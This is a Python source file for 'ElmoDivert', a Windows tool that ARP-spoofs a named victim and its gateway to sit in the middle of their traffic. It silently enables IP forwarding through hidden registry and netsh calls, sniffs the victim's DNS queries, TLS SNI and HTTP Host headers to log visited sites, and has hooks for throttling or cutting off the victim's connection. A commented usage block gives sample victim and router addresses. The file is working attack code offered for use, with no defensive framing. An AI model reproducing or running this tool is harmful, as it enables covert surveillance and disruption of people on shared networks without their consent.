import time
import threading
import subprocess
from scapy.all import ARP, Ether, sendp, IP, DNS, DNSQR, TCP, sniff
from tools.utils import threaded
from subprocess import CREATE_NO_WINDOW, STARTUPINFO, STARTF_USESHOWWINDOW, SW_HIDE

def _no_window_kwargs():
    si = STARTUPINFO()
    si.dwFlags |= STARTF_USESHOWWINDOW
    si.wShowWindow = SW_HIDE
    return {'startupinfo': si, 'creationflags': CREATE_NO_WINDOW}

class ElmoDivert:
    def __init__(
        self,
        victim_ip: str,
        gateway_ip: str,
        interface: str = "Wi-Fi",
        target_mbits: float = 2.0,
        victim_mac: str = None,
        router_mac: str = None,
        my_mac: str = None,
        callback=None  # Callback(hostname: str, protocol: str) -> None
    ):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mbits = target_mbits
        self.victim_mac = victim_mac
        self.router_mac = router_mac
        self.my_mac = my_mac
        self.callback = callback or (lambda h, p: None)
        self.kill_device = False

        # Runtime controls
        self.divert_sleep = 0.0
        self._running = False
        self._spoof_thread = None
        self._capture_thread = None
        self._stop_event = threading.Event()

        self._to_victim = None
        self._to_router = None

    # ====================== IP FORWARDING ======================

    @staticmethod
    def is_ip_forwarding_enabled(interface: str) -> bool:
        """
        Check if IP forwarding is enabled on Windows.
        Returns True only if both registry and interface forwarding are enabled.
        """
        registry_enabled = False
        interface_enabled = False

        # 1. Check Registry
        try:
            result = subprocess.run(
                ['reg', 'query', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
                 '/v', 'IPEnableRouter'],
                capture_output=True, text=True, check=False, **_no_window_kwargs()
            )
            if result.returncode == 0 and "0x1" in result.stdout:
                registry_enabled = True
        except Exception as e:
            print(f"[Check] Registry query failed: {e}")

        # 2. Check Interface Forwarding via netsh
        try:
            result = subprocess.run(
                ['netsh', 'interface', 'ipv4', 'show', 'interface', f'"{interface}"'],
                capture_output=True, text=True, check=False, **_no_window_kwargs()
            )
            if result.returncode == 0:
                # Look for "Forwarding" status
                if "Forwarding" in result.stdout and "enabled" in result.stdout.lower():
                    interface_enabled = True
        except Exception as e:
            print(f"[Check] netsh interface check failed: {e}")

        status = registry_enabled and interface_enabled
        print(f"[IP Forwarding Check] Registry: {'Enabled' if registry_enabled else 'Disabled'} | "
              f"Interface '{interface}': {'Enabled' if interface_enabled else 'Disabled'}")
        
        return status

    @staticmethod
    def enable_ip_forwarding(interface: str):
        """Enable Windows IP forwarding via registry and netsh"""
        print("Enabling IP forwarding...")

        # Registry method
        try:
            subprocess.run(
                ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
                 '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '1', '/f'],
                check=True, capture_output=True, **_no_window_kwargs()
            )
            print("[1] Registry IPEnableRouter enabled")
        except Exception as e:
            print(f"[1] Failed to enable IP forwarding (registry): {e}")

        # netsh interface method
        try:
            subprocess.run(
                ['netsh', 'interface', 'ipv4', 'set', 'interface', f'"{interface}"', 'forwarding=enabled'],
                check=True, capture_output=True, **_no_window_kwargs()
            )
            print(f"[2] Interface '{interface}' forwarding enabled")
        except Exception as e:
            print(f"[2] Failed to enable interface forwarding: {e}")

        # Verify
        time.sleep(0.5)
        if ElmoDivert.is_ip_forwarding_enabled(interface):
            print("IP forwarding appears to be enabled.")
        else:
            print("IP forwarding may still need a system reboot to take effect.")

    @staticmethod
    def disable_ip_forwarding(interface: str):
        """Disable Windows IP forwarding via registry and netsh"""
        print("Disabling IP forwarding...")

        # Registry method
        try:
            subprocess.run(
                ['reg', 'add', 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
                 '/v', 'IPEnableRouter', '/t', 'REG_DWORD', '/d', '0', '/f'],
                check=True, capture_output=True, **_no_window_kwargs()
            )
            print("[1] Registry IPEnableRouter disabled")
        except Exception as e:
            print(f"[1] Failed to disable IP forwarding (registry): {e}")

        # netsh interface method
        try:
            subprocess.run(
                ['netsh', 'interface', 'ipv4', 'set', 'interface', f'"{interface}"', 'forwarding=disabled'],
                check=True, capture_output=True, **_no_window_kwargs()
            )
            print(f"[2] Interface '{interface}' forwarding disabled")
        except Exception as e:
            print(f"[2] Failed to disable interface forwarding: {e}")

    # ====================== REST OF THE CLASS ======================

    # @staticmethod
    # def register_driver():
    #     return
    #     if not pydivert.WinDivert.is_registered():
    #         print("Registering WinDivert driver...")
    #         pydivert.WinDivert.register()
    #         print("WinDivert driver registered.")
    #     else:
    #         print("WinDivert driver already registered.")

    # @staticmethod
    # def unregister_driver():
    #     return
    #     if pydivert.WinDivert.is_registered():
    #         print("Unregistering WinDivert driver...")
    #         pydivert.WinDivert.unregister()
    #         print("WinDivert driver unregistered.")

    def _build_arp_packets(self):
        if not self.my_mac:
            from scapy.all import get_if_hwaddr
            self.my_mac = get_if_hwaddr(self.interface)

        self._to_victim = Ether(dst=self.victim_mac) / ARP(
            op=2, psrc=self.gateway_ip, hwsrc=self.my_mac,
            hwdst=self.victim_mac, pdst=self.victim_ip
        )

        self._to_router = Ether(dst=self.router_mac) / ARP(
            op=2, psrc=self.victim_ip, hwsrc=self.my_mac,
            hwdst=self.router_mac, pdst=self.gateway_ip
        )

    def _arp_spoof_worker(self):
        if not self._to_victim or not self._to_router:
            self._build_arp_packets()

        print("ARP spoofing started...")
        while not self._stop_event.is_set():
            try:
                sendp(self._to_victim, iface=self.interface, verbose=0)
                sendp(self._to_router, iface=self.interface, verbose=0)
            except Exception as e:
                print(f"[ARP spoof error] {e}")
            time.sleep(1.0)

    def _extract_sni(self, payload: bytes) -> str | None:
        try:
            if len(payload) < 43 or payload[0] != 0x16:
                return None
            pos = 5
            if payload[pos] != 1:
                return None
            pos += 4
            pos += 2 + 32
            pos += 1 + payload[pos]
            pos += 2 + int.from_bytes(payload[pos:pos + 2], 'big')
            pos += 1 + payload[pos]

            if pos + 2 > len(payload):
                return None
            ext_len = int.from_bytes(payload[pos:pos + 2], 'big')
            pos += 2
            end = pos + ext_len

            while pos < end:
                if pos + 4 > len(payload):
                    break
                ext_type = int.from_bytes(payload[pos:pos + 2], 'big')
                ext_size = int.from_bytes(payload[pos + 2:pos + 4], 'big')
                pos += 4

                if ext_type == 0x0000:
                    name_len = int.from_bytes(payload[pos + 3:pos + 5], 'big')
                    return payload[pos + 5:pos + 5 + name_len].decode('utf-8', errors='ignore')
                pos += ext_size
        except:
            pass
        return None

    # def _capture_worker(self):
    #     filter_str = f"(ip.SrcAddr == {self.victim_ip} or ip.DstAddr == {self.victim_ip})"
    #     print(f"Starting capture on {self.interface}...")

    #     try:
    #         with pydivert.WinDivert(filter_str, layer=pydivert.Layer.NETWORK_FORWARD) as w:
    #             while not self._stop_event.is_set():
    #                 try:
    #                     packet = w.recv()
    #                     scapy_pkt = IP(bytes(packet.raw))

    #                     hostname = None
    #                     protocol = "UNKNOWN"

    #                     if scapy_pkt.haslayer(DNS) and scapy_pkt[DNS].qd:
    #                         try:
    #                             qname = scapy_pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
    #                             if qname:
    #                                 hostname = qname
    #                                 protocol = "DNS"
    #                         except:
    #                             pass

    #                     elif scapy_pkt.haslayer(TCP) and scapy_pkt[TCP].dport == 443:
    #                         try:
    #                             sni = self._extract_sni(bytes(scapy_pkt[TCP].payload))
    #                             if sni:
    #                                 hostname = sni
    #                                 protocol = "HTTPS"
    #                         except:
    #                             pass

    #                     if hostname and self.callback and not self.kill_device:
    #                         print(f"[ElmoDivert] {protocol} → {hostname}")
    #                         self.callback(hostname, protocol)

    #                     if self.divert_sleep > 0:
    #                         time.sleep(self.divert_sleep)

    #                     if not self.kill_device:
    #                         w.send(packet)

    #                 except Exception:
    #                     if 'packet' in locals():
    #                         try:
    #                             if not self.kill_device:
    #                                 w.send(packet)
    #                         except:
    #                             pass

    #     except Exception as e:
    #         print(f"Capture error: {e}")
    #     finally:
    #         print("Capture stopped.")

    def _capture_worker(self):
        filter_str = f"host {self.victim_ip} and (port 53 or port 443 or port 80)"
        print(f"Starting capture on {self.interface}...")

        def handle(pkt):
            if self._stop_event.is_set():
                return True  # tells sniff() to stop

            hostname = None
            protocol = "UNKNOWN"

            if pkt.haslayer(DNS) and pkt[DNS].qd:
                try:
                    qname = pkt[DNSQR].qname.decode('utf-8', errors='ignore').rstrip('.')
                    if qname:
                        hostname, protocol = qname, "DNS"
                except:
                    pass

            elif pkt.haslayer(TCP) and pkt[TCP].dport == 443 and pkt.haslayer('Raw'):
                sni = self._extract_sni(bytes(pkt['Raw'].load))
                if sni:
                    hostname, protocol = sni, "HTTPS"

            elif pkt.haslayer(TCP) and pkt[TCP].dport == 80 and pkt.haslayer('Raw'):
                try:
                    payload = bytes(pkt['Raw'].load)
                    if payload.startswith((b'GET', b'POST', b'HEAD')):
                        host_line = next((l for l in payload.split(b'\r\n')
                                        if l.lower().startswith(b'host:')), None)
                        if host_line:
                            hostname = host_line.split(b':', 1)[1].strip().decode(errors='ignore')
                            protocol = "HTTP"
                except:
                    pass

            if hostname and self.callback:
                print(f"[ElmoDivert] {protocol} → {hostname}")
                self.callback(hostname, protocol)

        try:
            sniff(
                filter=filter_str,
                prn=handle,
                store=0,
                iface=self.interface,
                stop_filter=lambda p: self._stop_event.is_set()
            )
        except Exception as e:
            print(f"Capture error: {e}")
        finally:
            print("Capture stopped.")

    def start(self):
        if self._running:
            print("Already running.")
            return

        self._stop_event.clear()
        if not ElmoDivert.is_ip_forwarding_enabled(self.interface):
            ElmoDivert.enable_ip_forwarding(self.interface)

        self._spoof_thread = threading.Thread(target=self._arp_spoof_worker, daemon=True)
        self._capture_thread = threading.Thread(target=self._capture_worker, daemon=True)

        self._spoof_thread.start()
        self._capture_thread.start()

        self._running = True
        print("ElmoDivert started.")

    @threaded
    def stop(self):
        if not self._running:
            return
        print("Stopping ElmoDivert...")
        self._stop_event.set()

        if self._capture_thread and self._capture_thread.is_alive():
            self._capture_thread.join(timeout=5)
        if self._spoof_thread and self._spoof_thread.is_alive():
            self._spoof_thread.join(timeout=3)

        self._running = False
        print("ElmoDivert stopped.")
        if self.callback:
            try:
                self.callback(None, None)
            except:
                pass

    def is_running(self) -> bool:
        return self._running
    
# def hostname_callback(hostname: str, protocol: str):
#     print(f"[ElmoDivert] {protocol} → {hostname}")

# # Create instance
# divert = ElmoDivert(
#     victim_ip="192.168.1.8",
#     gateway_ip="192.168.1.1",
#     interface="Wi-Fi",
#     victim_mac="BC:A0:80:27:FE:B8",
#     router_mac="DC:51:93:B0:DF:28",
#     my_mac="00:72:EE:15:C6:92",
#     callback=hostname_callback
# )

# # Register once (as admin)
# ElmoDivert.register_driver()

# # Start
# divert.start()

# # Adjust throttling live
# divert.divert_sleep = 0.15   # Increase for stronger throttling
# time.sleep(30)
# # Later...
# divert.stop()